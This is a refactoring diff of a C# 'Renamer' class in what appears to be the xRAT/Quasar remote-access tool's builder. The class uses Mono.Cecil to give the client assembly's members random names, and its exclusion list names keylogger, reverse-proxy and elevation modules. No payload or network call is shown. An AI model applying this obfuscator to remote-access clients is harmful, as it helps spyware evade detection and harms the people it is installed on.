@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Linq;
 using System.Text;
 using Mono.Cecil;
 
@@ -12,11 +13,11 @@ namespace xServer.Core.Build
         /// </summary>
         public AssemblyDefinition AsmDef { get; set; }
 
-        private int length { get; set; }
-        private MemberOverloader TypeOverloader;
-        private Dictionary<TypeDefinition, MemberOverloader> methodOverloaders;
-        private Dictionary<TypeDefinition, MemberOverloader> fieldOverloaders;
-        private Dictionary<TypeDefinition, MemberOverloader> eventOverloaders;
+        private int Length { get; set; }
+        private MemberOverloader _typeOverloader;
+        private Dictionary<TypeDefinition, MemberOverloader> _methodOverloaders;
+        private Dictionary<TypeDefinition, MemberOverloader> _fieldOverloaders;
+        private Dictionary<TypeDefinition, MemberOverloader> _eventOverloaders;
 
         public Renamer(AssemblyDefinition asmDef)
             : this(asmDef, 20)
@@ -26,11 +27,11 @@ namespace xServer.Core.Build
         public Renamer(AssemblyDefinition asmDef, int length)
         {
             this.AsmDef = asmDef;
-            this.length = length;
-            TypeOverloader = new MemberOverloader(this.length);
-            methodOverloaders = new Dictionary<TypeDefinition, MemberOverloader>();
-            fieldOverloaders = new Dictionary<TypeDefinition, MemberOverloader>();
-            eventOverloaders = new Dictionary<TypeDefinition, MemberOverloader>();
+            this.Length = length;
+            _typeOverloader = new MemberOverloader(this.Length);
+            _methodOverloaders = new Dictionary<TypeDefinition, MemberOverloader>();
+            _fieldOverloaders = new Dictionary<TypeDefinition, MemberOverloader>();
+            _eventOverloaders = new Dictionary<TypeDefinition, MemberOverloader>();
         }
 
         /// <summary>
@@ -41,12 +42,9 @@ namespace xServer.Core.Build
         {
             try
             {
-                foreach (var module in AsmDef.Modules)
+                foreach (TypeDefinition typeDef in AsmDef.Modules.SelectMany(module => module.Types))
                 {
-                    foreach (TypeDefinition typeDef in module.Types)
-                    {
-                        RenameInType(typeDef);
-                    }
+                    RenameInType(typeDef);
                 }
                 return true;
             }
@@ -58,11 +56,10 @@ namespace xServer.Core.Build
 
         private void RenameInType(TypeDefinition typeDef)
         {
-            if (typeDef.Namespace.StartsWith("My")
-                || typeDef.Namespace == "xClient.Core"
+            if (typeDef.Namespace == "xClient.Core"
                 || typeDef.Namespace == "xClient.Core.Elevation"
                 || typeDef.Namespace == "xClient.Core.Compression"
-                || typeDef.Namespace == "xCore.Client.Networking"
+                || typeDef.Namespace == "xClient.Core.Networking"
                 || typeDef.Namespace.StartsWith("ProtoBuf")
                 || typeDef.Namespace.StartsWith("xClient.Core.ReverseProxy")
                 || typeDef.Namespace.StartsWith("xClient.Core.Keylogger")
@@ -70,7 +67,7 @@ namespace xServer.Core.Build
                 || typeDef.HasInterfaces)
                 return;
 
-            TypeOverloader.GiveName(typeDef);
+            _typeOverloader.GiveName(typeDef);
 
             typeDef.Namespace = string.Empty;
 
@@ -83,16 +80,12 @@ namespace xServer.Core.Build
                     RenameInType(nestedType);
 
             if (typeDef.HasMethods)
-                foreach (MethodDefinition methodDef in typeDef.Methods)
-                    if (!methodDef.IsConstructor)
-                    {
-                        methodOverloader.GiveName(methodDef);
-                    }
+                foreach (MethodDefinition methodDef in typeDef.Methods.Where(methodDef => !methodDef.IsConstructor))
+                    methodOverloader.GiveName(methodDef);
 
             if (typeDef.HasFields)
                 foreach (FieldDefinition fieldDef in typeDef.Fields)
                     fieldOverloader.GiveName(fieldDef);
-
 
             if (typeDef.HasEvents)
                 foreach (EventDefinition eventDef in typeDef.Events)
@@ -101,17 +94,17 @@ namespace xServer.Core.Build
 
         private MemberOverloader GetMethodOverloader(TypeDefinition typeDef)
         {
-            return GetOverloader(this.methodOverloaders, typeDef);
+            return GetOverloader(this._methodOverloaders, typeDef);
         }
 
         private MemberOverloader GetFieldOverloader(TypeDefinition typeDef)
         {
-            return GetOverloader(this.fieldOverloaders, typeDef);
+            return GetOverloader(this._fieldOverloaders, typeDef);
         }
 
         private MemberOverloader GetEventOverloader(TypeDefinition typeDef)
         {
-            return GetOverloader(this.eventOverloaders, typeDef);
+            return GetOverloader(this._eventOverloaders, typeDef);
         }
 
         private MemberOverloader GetOverloader(Dictionary<TypeDefinition, MemberOverloader> overloaderDictionary,
@@ -120,7 +113,7 @@ namespace xServer.Core.Build
             MemberOverloader overloader;
             if (!overloaderDictionary.TryGetValue(targetTypeDef, out overloader))
             {
-                overloader = new MemberOverloader(this.length);
+                overloader = new MemberOverloader(this.Length);
                 overloaderDictionary.Add(targetTypeDef, overloader);
             }
             return overloader;
@@ -130,21 +123,21 @@ namespace xServer.Core.Build
         {
             private bool DoRandom { get; set; }
             private int StartingLength { get; set; }
-            private Dictionary<string, string> RenamedMembers = new Dictionary<string, string>();
-            private char[] CharMap;
-            private int[] Indices;
+            private Dictionary<string, string> _renamedMembers = new Dictionary<string, string>();
+            private readonly char[] _charMap;
+            private int[] _indices;
 
             public MemberOverloader(int startingLength, bool doRandom = true)
                 : this(startingLength, doRandom, "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToLower().ToCharArray())
             {
             }
 
-            public MemberOverloader(int startingLength, bool doRandom, char[] chars)
+            private MemberOverloader(int startingLength, bool doRandom, char[] chars)
             {
-                this.CharMap = chars;
+                this._charMap = chars;
                 this.DoRandom = doRandom;
                 this.StartingLength = startingLength;
-                this.Indices = new int[startingLength];
+                this._indices = new int[startingLength];
             }
 
             public void GiveName(MemberReference member)
@@ -152,19 +145,16 @@ namespace xServer.Core.Build
                 string currentName = GetCurrentName();
                 string originalName = member.ToString();
                 member.Name = currentName;
-                while (RenamedMembers.ContainsValue(member.ToString()))
+                while (_renamedMembers.ContainsValue(member.ToString()))
                 {
                     member.Name = GetCurrentName();
                 }
-                RenamedMembers.Add(originalName, member.ToString());
+                _renamedMembers.Add(originalName, member.ToString());
             }
 
             private string GetCurrentName()
             {
-                if (DoRandom)
-                    return GetRandomName();
-                else
-                    return GetOverloadedName();
+                return DoRandom ? GetRandomName() : GetOverloadedName();
             }
 
             private string GetRandomName()
@@ -182,22 +172,22 @@ namespace xServer.Core.Build
             private string GetOverloadedName()
             {
                 IncrementIndices();
-                char[] chars = new char[Indices.Length];
-                for (int i = 0; i < Indices.Length; i++)
-                    chars[i] = CharMap[Indices[i]];
+                char[] chars = new char[_indices.Length];
+                for (int i = 0; i < _indices.Length; i++)
+                    chars[i] = _charMap[_indices[i]];
                 return new string(chars);
             }
 
             private void IncrementIndices()
             {
-                for (int i = Indices.Length - 1; i >= 0; i--)
+                for (int i = _indices.Length - 1; i >= 0; i--)
                 {
-                    Indices[i]++;
-                    if (Indices[i] >= CharMap.Length)
+                    _indices[i]++;
+                    if (_indices[i] >= _charMap.Length)
                     {
                         if (i == 0)
-                            Array.Resize(ref Indices, Indices.Length + 1);
-                        Indices[i] = 0;
+                            Array.Resize(ref _indices, _indices.Length + 1);
+                        _indices[i] = 0;
                     }
                     else
                         break;
